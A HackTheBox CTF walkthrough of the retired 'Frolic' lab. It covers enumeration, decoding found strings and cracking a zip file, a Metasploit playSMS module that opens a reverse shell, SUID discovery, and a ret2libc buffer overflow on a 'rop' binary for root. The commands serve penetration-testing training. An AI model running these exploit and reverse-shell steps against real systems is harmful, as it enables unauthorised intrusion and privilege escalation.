<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">HacktheBox Frolic Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-frolic-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-03-30T14:46:58+00:00">March 30, 2019</time><time class="updated" datetime="2025-06-29T13:18:36+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Frolic”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level</strong>: Expert</span></p>
<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Frolic is 10.10.10.111</span></p>
<h3><span style="color: #800000;">Penetrating Methodology</span></h3>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTPS service port (9999)</span></li>
<li><span style="color: #000000;">Enumerating directory using dirb</span></li>
<li><span style="color: #000000;">Enumerating web application</span></li>
<li><span style="color: #000000;">Finding Playsms management system</span></li>
<li><span style="color: #000000;">Exploiting </span>playsms<span style="color: #000000;"> and getting </span>a reverse<span style="color: #000000;"> shell</span></li>
<li><span style="color: #000000;">Getting user flag</span></li>
<li><span style="color: #000000;">Finding SUID bit files</span></li>
<li><span style="color: #000000;">Finding </span>a vulnerability<span style="color: #000000;"> in the binary</span></li>
<li><span style="color: #000000;">Exploiting binary and getting </span>a root<span style="color: #000000;"> shell</span></li>
<li><span style="color: #000000;">Getting </span>the root<span style="color: #000000;"> flag</span></li>
</ul>
<h3><span style="color: #000000;">Walkthrough</span></h3>
<h3><span style="color: #800000;">Scanning</span></h3>
<p><span style="color: #000000;">Let’s start off with our basic Nmap command to find out the open ports and services.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 10.10.10.111</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nocpZGsS0Wc/XJ99S7KavwI/AAAAAAAAdtw/K3iSBgY8ogUulKJxykLWCToYcExP5boTgCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">The Nmap scan shows us that there are 4 ports are open: 22(SSH), 139(SMB), 445(SMB), 9999(HTTP)</span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">As port 9999 is running HTTP service, we open the IP address in the web browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EnImoxu5XxA/XJ99VM4NNoI/AAAAAAAAduM/JGMFBOrP41870j8to6We0ldiXuC7pCvjQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We don’t find anything on the web page, so we further enumerate the web service using dirb scan.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.111:9999/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IVsxj7QvUFY/XJ99XjfeWvI/AAAAAAAAdus/A40LdIfTSJ0unIu-3LE_coG5ehCEspdxQCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Dirb scan gave us a few interesting looking links, we open a link called /admin/ and find a login page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-NJD66bLIxmk/XJ99Yv4zVBI/AAAAAAAAdu4/Uwq7RmZsj1gP8WFXm_JTw3N3amVHBkvIACLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We take a look at the source code and find a link called “login.js”.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-M8xAIfOaHqQ/XJ99ZDbsDkI/AAAAAAAAdu8/FgVge9lfeLM6rt4jMLLw6_zq3ZY6Z6mxwCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We open the “login.js” and find username and password hardcoded in the JavaScript.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-xz5I2qAcDmQ/XJ99ZlzKSBI/AAAAAAAAdvE/kyub0_7NdDMQOYTW8MMzYF3scrEJP3iVgCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Then, we use the username and password we found earlier to </span>login<span style="color: #000000;">. After logging in we find “look” encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CKpi1FQsjBw/XJ99ZqwAc3I/AAAAAAAAdvA/1QmoZ0_gF_ULWxG8ju23vzfTQdleWvjiQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">We decode the string and a link inside.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-n_d0NmPNZuY/XJ99aCeJpLI/AAAAAAAAdvI/U_InrE5w5ygodT-IO--3KKnfTfrFZcsIQCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We open the link and find a page with base64 encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vTbGFMJAzFU/XJ99S40cJVI/AAAAAAAAdt0/et-HPLBYrJULm4m7UVeMGD8uK-4tVFm_wCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Then, we copy the base64 encoded string and save it in our system and then convert it and save it in a file. We check the file type and find it is a zip file. Then, we try to extract it and find it is password protected. We use fcrackzip to bruteforce the zip file and find the password to be “password”. Afterwards, we extract the files from the zip file and find a file called index.php. Then, we take a look at the content of the file and find hex encoded string.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">base64 -d code &gt; encodedfile
file encodedfile
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u encodedfile
unzip encodedfile</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-FF2r5ONtbbg/XJ99SqXQukI/AAAAAAAAdts/PMKj7VUBV4wnCw8HEAwy19xrETd4FXfxgCLcBGAs/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Then, we decoded the string using burpsuite and find a base64 encoded string. We decode the base64 encoded string and find a brainfuck encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2hohQGpiB64/XJ99To-pqcI/AAAAAAAAdt4/o38_ioDqwds3sPwIEfMPLw0QQzF6FvSngCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Again, we decoded the brainfuck encoded string and find a string called “</span>idkwhatispass<span style="color: #000000;">”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-_eNMNghaXVw/XJ99UIcT2BI/AAAAAAAAduA/qNnyr-fB2n4VT_-kZnB5Fpq0Oexh0qzygCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We open /</span>playsms<span style="color: #000000;"> directory and find </span>playsms<span style="color: #000000;"> CMS login page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vP3KR-QnQIw/XJ99UaKZGgI/AAAAAAAAduE/D3gCNtwEj0kJ0fiDUEeb_PPD_n8-5JdQgCLcBGAs/s1600/18.png"/></span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">We try username “admin” and password “</span>idkwhatispass<span style="color: #000000;">” to </span>login<span style="color: #000000;"> and are successfully able to </span>login<span style="color: #000000;">. So we use </span>Metasploit<span style="color: #000000;"> to get a reverse shell using these credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/multi/http/playsms_uploadcsv_exec
msf exploit(multi/http/playsms_uploadcsv_exec) &gt; set rhosts 10.10.10.111
msf exploit(multi/http/playsms_uploadcsv_exec) &gt; set rport 9999
msf exploit(multi/http/playsms_uploadcsv_exec) &gt; set targeturi /playsms
msf exploit(multi/http/playsms_uploadcsv_exec) &gt; set username admin
msf exploit(multi/http/playsms_uploadcsv_exec) &gt; set password idkwhatispass
msf exploit(multi/http/playsms_uploadcsv_exec) &gt; set lhost tun0
msf exploit(multi/http/playsms_uploadcsv_exec) &gt; exploit</pre>
<p><span style="color: #000000;">After getting a reverse shell, we spawn a TTY shell and start enumerating the system. Inside /home/</span>aysush<span style="color: #000000;"> directory we find a file called “user.txt”. We open the file and find the first flag. Then we start looking for files with SUID bit set and find a file called “</span>rop<span style="color: #000000;">” inside “/home/ayush/</span>.binary<span style="color: #000000;">” directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-i7VAZeuny6E/XJ99U6giS4I/AAAAAAAAduI/okle5J12kxQGSvHtlF9i1USk27Hzc3DlgCLcBGAs/s1600/19.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c "import pty; pty.spawn('/bin/bash')"
find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9D4SmSKhTck/XJ99VQUrLtI/AAAAAAAAduQ/jYLSQfqaLWsGrGEA1GwJM3_DaMDZMV3PQCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">The target machine doesn’t have “gdb”, so we download the “</span>rop<span style="color: #000000;">” file in our system and start looking for vulnerabilities. We create a 150 bytes long pattern with pattern_create.rb file in our system and then open the file with “gdb” and supply the pattern as an argument to our file. As soon as we run the application we get a segmentation fault. Now as we can overwrite instruction pointer that means the application is vulnerable to buffer overflow.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gdb -q rop
r &lt;pattern&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-6HwKliLo1W4/XJ99V86IzDI/AAAAAAAAduU/7GUTvcDOoewVJsLtG-JAoSns0rio-r0rwCLcBGAs/s1600/24.png"/></span></p>
<p><span style="color: #000000;">We copy the value of EIP and use “pattern_offset.</span>rb<span style="color: #000000;">” script to find the EIP offset.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./pattern_offset -q 0x62413762</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-s8-6_NspxNY/XJ99WFRGd8I/AAAAAAAAduY/hR0nts1IZUgihPXsV8HndoHVBUINVSN3wCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">As it is difficult for us to make a jump to </span>stack<span style="color: #000000;"> because we cannot get the address of the stack we want to jump. So we use ret2libc to exploit the vulnerability and get a shell. Now in our </span>system<span style="color: #000000;">, we first find the address of “system” function and a return address. Now we find the address of “/bin/sh” to execute using “system” function.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">p system
p exit
find 0xf7e0c980, +9999999, "/bin/sh"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Od2NluFJC4c/XJ99WaGodNI/AAAAAAAAduc/bg44jI2v7jQM_IgoroqBZOBmfsZuKJ9cgCLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;">We write an exploit and check if we can exploit the application to spawn a shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-c-B0a89FUf8/XJ99WquVI4I/AAAAAAAAdug/sauoAK8m0FwtCbu3bDwJEq2LLTF0N2rIgCLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">We run the exploit in our system and are successfully able to spawn a shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">r $(python exploit.py)</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AgG60jS5JLA/XJ99W-E7UiI/AAAAAAAAduk/pLXYhmwJ4XcaiySrzCURxtMIhFuw_c6GACLcBGAs/s1600/28.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Getting Root Excess</span></span></h3>
<p><span style="color: #000000;">Now we cannot directly run this exploit on the target system, as we don’t have the addresses of the </span>libc<span style="color: #000000;"> functions of the target system. We are going to change the addresses of the exploit according to the target machine. </span>First<span style="color: #000000;">, get the address of </span>libc<span style="color: #000000;"> used by the binary. As we don’t have gdb in the target system, so we use </span>readelf<span style="color: #000000;">, strings and grep to find “system”, “exit” and “/bin/sh” for our exploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldd /home/ayush/.binary/rop |grep libc
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
strings -tx /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-LCj8i6XHvig/XJ99XAsTmeI/AAAAAAAAduo/ZP1UOE72sfMMOXuV20dFa3q5OBPp_wwxQCLcBGAs/s1600/29.png"/></span></p>
<p><span style="color: #000000;">We have to add the value of “system”, “exit” and “/bin/sh” to the address of </span>libc<span style="color: #000000;"> to get the address of “system”, “exit” and “/bin/sh</span>”.<span style="color: #000000;">Now we make the following changes to the exploit. You can download the exploit from here.</span></p>
<h3><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cwYO_eqbLes/XJ99YFF1f9I/AAAAAAAAduw/0-DUeV2vbNcQEpInlfAijz-es_b0bLarACLcBGAs/s1600/30.png"/><br/>
</span></h3>
<p><span style="color: #000000;">Then, we transfer the exploit to the target machine and run the exploit. As soon as we run the exploit we are able to spawn a shell as </span>the root<span style="color: #000000;"> user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">/home/ayush/.binary/rop $(python /tmp/exploit.py)</pre>
<p><span style="color: #000000;">After getting a reverse shell, we switch to /root directory and get a file called “root.txt”. We take a look at the content of the file and get the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-s1rbbU6Jcjg/XJ99YXuKrhI/AAAAAAAAdu0/SkNslySnjbwJtRyw6-4dvjSjoH-niZ0lQCLcBGAs/s1600/31.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast<strong>. </strong>Contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
